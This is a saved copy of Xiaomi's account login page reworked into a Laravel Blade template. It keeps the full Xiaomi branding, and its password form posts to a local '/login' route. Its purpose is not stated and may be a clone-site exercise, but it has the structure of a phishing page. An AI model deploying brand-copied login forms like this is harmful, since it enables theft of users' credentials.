<html>
 <head>
   <link rel="stylesheet" href="/static/homes/login/login.css" />
   <script type="text/javascript" src="/static/homes/login/login.js"></script>
 </head>
 <body class="win_banner_stylepc win_banner_mistore zh_CN">
  登录页面  
  <!-- saved from url=(0262)https://account.xiaomi.com/pass/serviceLogin?callback=https%3A%2F%2Forder.mi.com%2Flogin%2Fcallback%3Ffollowup%3Dhttps%253A%252F%252Fwww.mi.com%252F%26sign%3DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%2C%2C&sid=mi_eshop&_bannerBiz=mistore&_qrsize=180 -->   
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
  <meta name="description" content="小米帐号能使用小米手机，MIUI，小米云，多看阅读，米聊，小米社区等小米服务。" /> 
  <meta name="keywords" content="小米帐号，小米账号，小米注册，注册，Mi Account，Sign in，小米，帐号，账号，小米帐户，登录，登陆，安全令牌，动态口令，小米注册，找回密码" /> 
  <script>
var LANG=(function(){
    var locale=("zh_CN").toLowerCase();
    if(locale){
      if(locale.indexOf("en")>-1){
        return {data:"en",cls:"en"};
      }else if(locale.indexOf("zh")>-1){
        if(locale.indexOf("cn")===-1){
          return {data:"tw",cls:"zh_TW"};
        }else{
          return {data:"cn",cls:"zh_CN"};
        }
      }
    }
    return {data:"en",cls:"en"};
})();
</script> 
  <script>
var _d_={};
/*fix ie下部分用户保护模式白屏：icacls %userprofile%\Appdata\LocalLow /t /setintegritylevel (OI)(CI)H*/
try{
  var supportLocalstorage=!!window.localStorage
}catch(e){
  var supportLocalstorage=false;
}
var _t_={
  statURL:'https://data.mistat.xiaomi.com/mistats',
  appId:"2882303761517246742",
  appKey:"5621724658742",
  jspcomplete:(new Date()).getTime(),
  supportLocalstorage:supportLocalstorage,
  samplingBase:100,
  samplingRate:5
};
if(window.performance){
  var timing=performance.timing;
  if(!timing.responseEnd){
    timing.responseEnd=timing.responseStart;
  }
  _d_.startTS=timing.fetchStart
  _d_.endTS=timing.responseEnd;
}else{
  _d_.startTS=_d_.endTS=(new Date()).getTime();
}
var JSP_VAR={
  deviceType:'PC',
  dataCenter:'c4',
  locale:'zh_CN',
  region:'CN',
  callback:"https://order.mi.com/login/callback?followup=https%3A%2F%2Fwww.mi.com%2F&sign=NzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw,,",
  sid:'mi_eshop',
  qs:"%3Fcallback%3Dhttps%253A%252F%252Forder.mi.com%252Flogin%252Fcallback%253Ffollowup%253Dhttps%25253A%25252F%25252Fwww.mi.com%25252F%2526sign%253DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%252C%252C%26sid%3Dmi_eshop%26_bannerBiz%3Dmistore%26_qrsize%3D180",
  hidden:'',
  "_sign":"KIoyNE+yRQmbP3xYn1eGTWJt4EE=",
  serviceParam :'{"checkSafePhone":false}',
  privacyLink:'https://www.mi.com/about/privacy/',
  agreeLink:'https://static.account.xiaomi.com/html/agreement/account/cn.html',
  showActiveXControl:false,
  loginMethods:["PWD","TICKET"]
};
var PAGE_VAR={
  form_cache:false,
  cache_key:(JSP_VAR.deviceType!=="mobile" ? "/static/res/44849db/account-static/html/login/dist/v2/login-cn.html" : "/static/res/44849db/account-static/html/login/dist/v2/login-wap-cn.html")
};

var localStorageKey='id.mi.com.login.'+( PAGE_VAR.cache_key.substring( PAGE_VAR.cache_key.indexOf("/account-static") ) || "main" );
var scopes='';
if(location.search.indexOf("_debugMode")>-1&&supportLocalstorage){
  window.localStorage && window.localStorage.removeItem(localStorageKey);
}

(function(){

  function getLocal(url){
    if(supportLocalstorage){
      var data=""+localStorage.getItem(localStorageKey);
      var index=data.indexOf("@")

      if(data.substring(0,index) == url){
        return data.substring(index+1)
      }
    }
    return null;
  }
  function setLocal(url,data){
    if(supportLocalstorage && data){
      try{
        localStorage.setItem(localStorageKey,url+"@"+data);
      }catch(e){}
    }
  }
  function getContent(url){
    var xhr= new (window.XMLHttpRequest || window.ActiveXObject)("Microsoft.XMLHTTP");
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
          setLocal(url,xhr.responseText);
          _t_.htmlGetEnd=(new Date()).getTime();
          document.write(xhr.responseText);
          document.close();
      }
    };
    xhr.open("GET",url,false);
    xhr.send();
  }
  var cache_key=PAGE_VAR.cache_key;
      _t_.version=cache_key;
  var html=getLocal(cache_key);
  if(html){
    _t_.htmlCache=true;
    PAGE_VAR.form_cache=true;
    document.write(html);
    document.close();
  }else{
    _t_.htmlCache=false;
    _t_.htmlGetStart=(new Date()).getTime();
    getContent(cache_key);
  }
})();
</script> 
  <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no" /> 
  <meta http-equiv="X-UA-Compatible" content="IE=Edge" /> 
  <title>小米帐号 - 登录</title>   
  <!-- <script src="https://static.verify.sec.xiaomi.com/js/v.js"></script> --> 
  <div class="wrapper"> 
   <!-- loading --> 
   <div class="popup_mask acquirePhoneMask" style="display:none;" id="loadingMask"> 
    <div class="bkc"></div> 
    <div class="mod_wrap loadingmask"> 
    </div> 
    <div class="loadingTips">
      正在检测你的帐号信息... 
    </div> 
   </div> 
   <!--bg_banner_start--> 
   <div class="bgiframe"> 
    <iframe name="ifr" style="height:100%" width="100%" height="686" src="/static/homes/login/loginbanner.html" id="bgiframe" frameborder="0" scrolling="no"></iframe> 
   </div> 
   <!--bg_banner_end--> 
   <div class="wrap"> 
    <div class="layout_panel"> 
     <div class="layout" id="layout"> 
      <!--表单输入登录--> 
      <div class="mainbox form-panel" id="login-main"> 
       <div id="custom_display_2"> 
        <a class="ercode" id="qrcode-trigger" href="javascript:void(0)"></a> 
       </div> 
       <!-- header s --> 
       <div class="lgnheader"> 
        <div class="header_tit t_c"> 
         <em id="custom_display_1" class="milogo"> 
          <svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg"> 
           <rect width="48" height="48" rx="3" ry="3" style="fill:#ff6700"></rect> 
           <rect x="10" y="15" width="4.2" height="18" style="fill:#FFFFFF"></rect> 
           <rect x="33.75" y="15" width="4.2" height="18" style="fill:#FFFFFF"></rect> 
           <rect x="11.25" y="15" width="15" height="4.1" style="fill:#FFFFFF"></rect> 
           <rect x="26.2" y="20.55" width="4.2" height="12.5" style="fill:#FFFFFF"></rect> 
           <rect x="20.6" y="15" width="9.8" height="9.8" rx="4.4" ry="4.4" style="fill:#FFFFFF"></rect> 
           <rect x="20.2" y="19" width="6" height="6" rx="2" ry="2" style="fill:#ff6700"></rect> 
           <rect x="18" y="19.1" width="4" height="2.2" style="fill:#ff6700"></rect> 
           <rect x="24.2" y="23" width="1.94" height="10" style="fill:#ff6700"></rect> 
           <rect x="18.1" y="22.8" width="4.2" height="10.2" style="fill:#FFFFFF"></rect> 
          </svg> </em> 
         <h4 class="header_tit_txt" id="login-title">小米帐号登录</h4> 
         <div class="site_info"></div> 
        </div> 
       </div> 
       <!-- header e --> 
       <!-- tab s --> 
       <div class="nav_tabs_panel"> 
        <div id="nav-tabs" class="nav_tabs"> 
         <a class="navtab-link now" href="javascript:void(0);" data-tab="pwd">帐号登录</a> 
         <span class="line"></span> 
         <a class="navtab-link" href="javascript:void(0);" data-tab="qr">扫码登录</a> 
        </div> 
       </div> 
       <!-- tab e --> 
       <!-- tab con s --> 
       <div class="tabs-con tabs_con now" data-con="pwd"> 
        <div> 
         <div class="login_area"> 






         <!-- 登录表单开始 -->
          <form action="/login" method="POST" id="login-main-form" method="post"> 
           <div class="loginbox c_b"> 
            <!-- 输入框 --> 
            <div class="lgn_inputbg c_b login-panel pwdLogin"> 
             <!--验证用户名--> 
             <div class="single_imgarea" id="account-info"> 
              <div class="na-img-area" id="account-avator" style="display:none"> 
               <div class="na-img-bg-area" id="account-avator-con"></div> 
              </div> 
              <p class="us_name tac" id="account-displayname"></p> 
              <p class="us_id tac"></p> 
             </div> 
             <label id="region-code" class="labelbox login_user c_b" for=""> 
              <div class="turn_area"> 
               <a class="btn_turn" id="manual_code" href="javascript:void(0);" title="关闭国家码"></a> 
              </div> 
              <div class="country_list"> 
               <div class="animation countrycode_selector" id="countrycode_selector"> 
                <span class="country_code"><tt class="countrycode-value" id="countrycode_value"></tt><i class="icon_arrow_down"></i></span> 
               </div> 
              </div> <input class="item_account" autocomplete="off" type="text" name="user" id="username" placeholder="邮箱/手机号码/小米ID" /> </label> 
             <div class="country-container" id="countrycode_container" style="display: none;"> 
              <div class="country_container_con" id="countrycode_container_con"></div> 
             </div> 
             <label class="labelbox pwd_panel c_b"> <input class="item_account" type="password" placeholder="密码" autocomplete="off" id="pwd" name="password" /> <input class="item_account" type="text" placeholder="密码" autocomplete="off" id="visiablePwd" name="visiablepwd" style="display:none" /> 
              <div class="eye_panel pwd-visiable"> 
               <i class="eye pwd-eye"> 
                <svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg"> 
                 <path class="eye_outer" d="M0 8 C6 0,14 0,20 8, 14 16,6 16, 0 8 z"></path> 
                 <circle class="eye_inner" cx="10" cy="8" r="3"></circle> 
                </svg> </i> 
              </div> 
              <div id="sms-code-panel" class="code_panel"> 
               <a href="javascript:;" id="getSMSCode">获取验证码</a> 
              </div> </label> 
            </div> 
            <div class="security_Controller" style="display: none;"> 
             <label class="checkbox_area"> <input type="checkbox" id="trustSecurityController" class="checkbox" />使用安全控件</label> 
            </div> 
            <div id="captcha"></div> 
            <!-- 错误信息 --> 
            <div class="err_tip" style="display: block"> 
             <div> 
              @if (session('error')) 
              <span class="error-con">{{session('error')}}</span> 
              @endif
             </div> 
            </div> 
            <!-- 登录频繁 --> 
            <div id="error-forbidden" class="err_forbidden">
              您的操作频率过快，请稍后再试。 
            </div> 
            <div class="btns_bg"> 
            {{csrf_field()}}
             <input class="btnadpt" id="login-button" type="submit" value="登录" /> 
             <span id="custom_display_8" class="sns-default-container sns_default_container" style="display: none;"> </span> 
            </div> 
            <div class="other_panel clearfix"> 
             <span id="custom_display_256" class="sms_link"> <a href="javascript:;" class="btnadpt btn_gray" id="ChangeLoginType">手机短信登录/注册</a> </span> 
             <div class="reverse"> 
              <div class="n_links_area" id="custom_display_64"> 
               <a class="outer-link" href="https://account.xiaomi.com/pass/register?callback=https%3A%2F%2Forder.mi.com%2Flogin%2Fcallback%3Ffollowup%3Dhttps%253A%252F%252Fwww.mi.com%252F%26sign%3DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%2C%2C&amp;sid=mi_eshop&amp;_bannerBiz=mistore&amp;_qrsize=180">立即注册</a> 
               <span>|</span> 
               <a class="outer-link" href="/lostpassword">忘记密码？</a> 
              </div> 
             </div> 
             <!-- 其他登录方式 s --> 
             <div style="display: block;" class="other_login_type sns-login-container" id="custom_display_16"> 
              <fieldset class="oth_type_tit"> 
               <legend align="center" class="oth_type_txt">其他方式登录</legend> 
              </fieldset> 
              <div class="oth_type_links"> 
               <a class="icon_type btn_qq sns-login-link" data-type="qq" href="https://account.xiaomi.com/pass/sns/login/auth?appid=100284651&amp;&amp;callback=https%3A%2F%2Forder.mi.com%2Flogin%2Fcallback%3Ffollowup%3Dhttps%253A%252F%252Fwww.mi.com%252F%26sign%3DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%2C%2C&amp;sid=mi_eshop" title="QQ登录" target="_blank"><i class="btn_sns_icontype icon_default_qq"></i></a> 
               <a class="icon_type btn_weibo sns-login-link" data-type="weibo" href="https://account.xiaomi.com/pass/sns/login/auth?appid=2996826273&amp;&amp;callback=https%3A%2F%2Forder.mi.com%2Flogin%2Fcallback%3Ffollowup%3Dhttps%253A%252F%252Fwww.mi.com%252F%26sign%3DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%2C%2C&amp;sid=mi_eshop" title="微博登录" target="_blank"><i class="btn_sns_icontype icon_default_weibo"></i></a> 
               <a class="icon_type btn_alipay sns-login-link" data-type="alipay" href="https://account.xiaomi.com/pass/sns/login/auth?appid=2088011127562160&amp;&amp;callback=https%3A%2F%2Forder.mi.com%2Flogin%2Fcallback%3Ffollowup%3Dhttps%253A%252F%252Fwww.mi.com%252F%26sign%3DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%2C%2C&amp;sid=mi_eshop" title="支付宝登录" target="_blank"><i class="btn_sns_icontype icon_default_alipay"></i></a> 
               <a class="icon_type btn_weixin sns-login-link" data-type="weixin" href="https://account.xiaomi.com/pass/sns/login/auth?appid=wxxmzh&amp;scope=snsapi_login&amp;callback=https%3A%2F%2Forder.mi.com%2Flogin%2Fcallback%3Ffollowup%3Dhttps%253A%252F%252Fwww.mi.com%252F%26sign%3DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%2C%2C&amp;sid=mi_eshop" title="微信登录" target="_blank"><i class="btn_sns_icontype icon_default_weixin"></i></a> 
              </div> 
             </div> 
             <!-- 其他登录方式 e --> 
             <p class="acq_tips" style="display: none;"></p> 
            </div> 
           </div> 
          </form> 


          <!-- 登录表单结束 -->
         </div> 
        </div> 
       </div> 
       <div class="tabs-con tabs_con" data-con="qr"> 
       </div> 
       <!-- tab con e --> 
      </div> 
      <div class="ercode_area" id="login-qrcode"> 
       <div class="ercode_pannel"> 
        <a class="code_close" href="javascript:void(0)" title="关闭" id="qrcode-close"><span class="icon_code_close"></span></a> 
        <div class="ercode_box"> 
         <div class="code_hd"> 
          <h3 class="code_tit">小米帐号扫码登录</h3> 
          <p>请打开「设置 &gt; 小米帐号 &gt; 右上角扫一扫」扫码登录</p> 
         </div> 
         <div class="code_iframe"> 
          <iframe style="background:#fff;" src="/static/homes/login/saved_resource.html" id="qriframe" frameborder="0" scrolling="no" sandbox="allow-scripts allow-same-origin allow-top-navigation"></iframe> 
         </div> 
         <div class="custom_sub_txt"> 
          <p id="custom-qr-name">使用<span>小米商城APP</span>扫一扫</p> 
          <p>小米手机可打开「设置」&gt;「小米帐号」扫码登录</p> 
         </div> 
        </div> 
       </div> 
      </div> 
      <!-- 取号注册 --> 
      <div id="ac-register" class="tac mode_panel form-panel" style="display: none"> 
       <h1>注册小米帐号</h1> 
       <div class="box"> 
        <img src="/static/homes/login/sim.png" alt="sim card" width="70" height="70" /> 
        <p>手机号：<span class="maskedPhone"></span></p> 
       </div> 
       <div class="err_tip"> 
        <div class="dis_box"> 
         <em class="icon_error"></em> 
         <span class="error-con"></span> 
        </div> 
       </div> 
       <div class="fixed_bot"> 
        <a href="javascript:;" class="btnadpt ok_btn">一键注册</a> 
        <a href="javascript:;" class="btnadpt no_btn btn_gray">登录其他帐号</a> 
       </div> 
       <p class="acq_tips" style="display: none">取号来源于中国移动</p> 
       <p class="agreeTip"><i class="icon_select icon_true"></i>同意小米的 <a href="https://static.account.xiaomi.com/html/agreement/account/cn.html" class="agreement_link">用户协议</a>和<a href="https://www.mi.com/about/privacy/" class="privacy_link"> 隐私政策 </a></p> 
      </div> 
      <!-- 回收号确认 --> 
      <div id="ac-confirm" class="tac mode_panel form-panel" style="display: none"> 
       <div> 
        <div class="box"> 
         <div class="na-img-area"> 
          <div class="na-img-bg-area us-portraitUrl"></div> 
         </div> 
         <div class="confirm_tips"> 
          <p class="us_name us-userName">昵称：<span class="usernameShow"></span></p> 
          <p>小米ID：<span class="useridShow"></span></p> 
          <!-- <p>注册时间：<span class="userRegisterDateShow"></span></p>
                    <p>注册设备：<span class="userRegisterDeviceShow"></span></p>
                    <p>注册来源：<span class="userRegisterOriginShow"></span></p>
                    <p>手机号：<span class="userPhoneShow"></span></p> --> 
          <h2>这是你的帐号吗？</h2> 
         </div> 
        </div> 
       </div> 
       <div class="err_tip"> 
        <div class="dis_box"> 
         <em class="icon_error"></em> 
         <span class="error-con"></span> 
        </div> 
       </div> 
       <div class="fixed_bot"> 
        <a href="javascript:;" class="btnadpt plain ok_btn">是我的，立即登录</a> 
        <a href="javascript:;" class="btnadpt plain no_btn">不是我的，注册新帐号</a> 
       </div> 
       <p class="acq_tips" style="display: none">取号来源于中国移动</p> 
       <p class="ptb30"> <a href="javascript:;" class="back_btn blue">登录其他帐号</a> </p> 
      </div> 
      <div id="set-pwd" class="mode_panel set_pwd_panel form-panel"> 
       <h4>请设置您的密码：</h4> 
       <label class="labelbox c_b"> <input class="item_account set-password re-password" type="password" name="password" placeholder="请输入密码" /> </label> 
       <label class="labelbox c_b"> <input class="item_account set-password" name="repassword" type="password" placeholder="请输入确认密码" /> </label> 
       <div class="err_tip pwd_tip"> 
        <div class="dis_box"> 
         <em class="icon_error"></em> 
         <span class="error-con" data-origin="密码长度8~16位，数字、字母、字符至少包含两种">密码长度8~16位，数字、字母、字符至少包含两种</span> 
        </div> 
       </div> 
       <div class="btns_bg"> 
        <a id="register-button" class="btnadpt">立即注册</a> 
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
  </div> 
  <div id="custom_display_4" class="n-footer"> 
   <div class="nf-link-area clearfix"> 
    <ul class="lang-select-list"> 
     <li><a href="javascript:void(0)" data-lang="zh_CN" class="lang-select-li current">简体</a>|</li> 
     <li><a href="https://account.xiaomi.com/pass/serviceLogin?callback=https%3A%2F%2Forder.mi.com%2Flogin%2Fcallback%3Ffollowup%3Dhttps%253A%252F%252Fwww.mi.com%252F%26sign%3DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%2C%2C&amp;sid=mi_eshop&amp;_bannerBiz=mistore&amp;_qrsize=180&amp;_locale=zh_TW" data-lang="zh_TW" class="lang-select-li">繁体</a>|</li> 
     <li><a href="https://account.xiaomi.com/pass/serviceLogin?callback=https%3A%2F%2Forder.mi.com%2Flogin%2Fcallback%3Ffollowup%3Dhttps%253A%252F%252Fwww.mi.com%252F%26sign%3DNzY3MDk1YzczNmUwMGM4ODAxOWE0NjRiNTU5ZGQyMzFhYjFmOGU0Nw%2C%2C&amp;sid=mi_eshop&amp;_bannerBiz=mistore&amp;_qrsize=180&amp;_locale=en" data-lang="en" class="lang-select-li">English</a>|</li> 
     <li><a href="https://static.account.xiaomi.com/html/faq/faqList.html" target="_blank">常见问题</a>|</li> 
     <li><a id="msg-privacy" href="https://www.mi.com/about/privacy/" target="_blank">隐私政策</a></li> 
    </ul> 
   </div> 
   <p class="nf-intro">小米公司版权所有-京ICP备10046444-<a class="beian-record-link" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802020134"><span><img src="/static/homes/login/ghs.png" /></span>京公网安备11010802020134号</a>-京ICP证110507号</p> 
  </div> 
  <div id="cookie-usage-notify" class="cookie_usage_notify"> 
  </div>
  <style>
﻿
</style> 
 
 


  <a target="_blank"></a> 
  <div class="modal_container" style="display: none;"> 
   <div class="modal_msk"></div> 
   <div class="modal_tip mod_acc_tip security-controller-modal" id="modal-id-0" style="display: none;"> 
    <div class="modal_tip_flex"> 
     <div class="modal_tip_hd modal-header"> 
      <div class="external_logo_area"> 
       <a class="milogo" href="javascript:void(0)"></a> 
      </div> 
      <div class="modal-header-text modal_tip_title">
        提示 
      </div> 
      <a href="javascript:void(0)" title="" class="modal-header-close btn_mod_close"><span>关闭</span></a> 
     </div> 
     <div class="modal_tip_bd modal-body"> 
      <div id="sect-controller-panel" class="security_controller_panel"> 
       <h4>您需要安装安全控件，才可使用安全登录。</h4> 
       <p>控件可对您的密码进行加密保护，提升账户安全性。</p> 
       <p>请点击“立即安装控件”按钮，并根据提示进行安装。</p> 
       <div class="tip_msg">
         完成安装后，请重新启动浏览器 
       </div> 
      </div> 
      <div class="tip_btns"> 
       <a title="立即安装控件" href="https://account.xiaomi.com/static/res/0369340/account-static/static/mipay/XiaomiCtrl.exe" class="btn_tip btn_commom btn-action-controller">立即安装控件</a> 
      </div> 
     </div> 
    </div> 
   </div> 
  </div>  
 </body>
</html>